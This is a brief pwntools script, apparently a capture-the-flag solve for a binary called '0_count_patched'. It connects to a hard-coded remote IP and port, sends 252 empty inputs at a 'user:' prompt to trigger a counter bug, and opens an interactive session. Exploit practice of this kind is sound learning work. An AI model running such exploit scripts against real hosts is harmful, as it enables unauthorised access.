#!/usr/bin/env python3

from pwn import *

elf = ELF("./0_count_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("77.37.125.41", 40443)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    for i in range(252):
        io.sendlineafter(b'user:', b'')

    io.interactive()

if __name__ == "__main__":
    main()
